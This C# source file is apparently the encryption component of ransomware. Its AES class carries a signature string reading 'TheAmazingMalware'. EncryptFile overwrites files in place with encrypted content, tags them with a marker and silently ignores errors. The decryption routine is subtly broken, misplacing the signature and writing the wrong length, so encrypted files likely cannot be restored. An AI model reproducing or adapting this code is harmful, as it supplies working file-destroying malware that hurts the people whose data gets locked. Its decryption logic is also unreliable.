using System;
using System.Collections.Generic;
using System.Diagnostics;
using System.IO;
using System.Linq;
using System.Security.Cryptography;
using System.Text;
using System.Threading.Tasks;
using System.Windows.Forms;

namespace TheWarehouse.Algorithm
{
    class AES
    {
        private static readonly int _saltSize = 32;
        private static readonly byte[] signature = Encoding.Unicode.GetBytes("TheAmazingMalware");

        public static void EncryptFile(string file, string key)
        {
            try
            {
                if (new FileInfo(file).Length >= signature.Length)
                {
                    byte[] bSig = new byte[signature.Length];

                    using (FileStream stream = new FileStream(file, FileMode.Open, FileAccess.Read))
                    {
                        stream.Seek(-signature.Length, SeekOrigin.End);
                        stream.Read(bSig, 0, bSig.Length);
                    }

                    if (!bSig.SequenceEqual(signature))
                    {
                        File.WriteAllBytes(file, Encrypt(File.ReadAllBytes(file), key));
                    }
                }
            } catch(Exception e) { }
        }

        public static void DecryptFile(string file, string key)
        {
            try
            {
                if (new FileInfo(file).Length >= signature.Length)
                {
                    byte[] bSig = new byte[signature.Length];

                    using (FileStream stream = new FileStream(file, FileMode.Open, FileAccess.Read))
                    {
                        stream.Seek(-signature.Length, SeekOrigin.End);
                        stream.Read(bSig, 0, bSig.Length);
                    }

                    if (bSig.SequenceEqual(signature))
                    {
                        MessageBox.Show("test");
                        File.WriteAllBytes(file, Decrypt(File.ReadAllBytes(file), key));
                    }
                }
            } catch(Exception e) { }
        }

        public static byte[] Encrypt(byte[] bytes, string key)
        {
            if (string.IsNullOrEmpty(key))
                throw new ArgumentNullException("key");

            using (var keyDerivationFunction = new Rfc2898DeriveBytes(key, _saltSize))
            {
                var saltBytes = keyDerivationFunction.Salt;
                var keyBytes = keyDerivationFunction.GetBytes(32);
                var ivBytes = keyDerivationFunction.GetBytes(16);

                using (var aesManaged = new AesManaged())
                using (var encryptor = aesManaged.CreateEncryptor(keyBytes, ivBytes))
                using (var memoryStream = new MemoryStream())
                {
                    using (var cryptoStream = new CryptoStream(memoryStream, encryptor, CryptoStreamMode.Write))
                    {
                        cryptoStream.Write(bytes, 0, bytes.Length);
                    }

                    var cipherTextBytes = memoryStream.ToArray();

                    Array.Resize(ref saltBytes, saltBytes.Length + cipherTextBytes.Length);
                    Array.Copy(cipherTextBytes, 0, saltBytes, _saltSize, cipherTextBytes.Length);

                    return saltBytes.Concat(signature).ToArray();
                }
            }
        }

        public static byte[] Decrypt(byte[] allTheBytes, string key)
        {
            if (string.IsNullOrEmpty(key))
                throw new ArgumentNullException("key");

            var saltBytes = allTheBytes.Take(_saltSize).ToArray();
            var ciphertextBytes = allTheBytes.Skip(_saltSize).Take(allTheBytes.Length - _saltSize).ToArray();
            var supercipherTextBytes = ciphertextBytes.Skip(signature.Length).Take(ciphertextBytes.Length - signature.Length).ToArray();

            using (var keyDerivationFunction = new Rfc2898DeriveBytes(key, saltBytes))
            {
                var keyBytes = keyDerivationFunction.GetBytes(32);
                var ivBytes = keyDerivationFunction.GetBytes(16);

                using (var aesManaged = new AesManaged())
                using (var decryptor = aesManaged.CreateDecryptor(keyBytes, ivBytes))
                using (var memoryStream = new MemoryStream())
                using (var cryptoStream = new CryptoStream(memoryStream, decryptor, CryptoStreamMode.Write))
                {
                    cryptoStream.Write(ciphertextBytes, 0, supercipherTextBytes.Length);
                    cryptoStream.FlushFinalBlock();

                    return memoryStream.ToArray();
                }
            }
        }
    }
}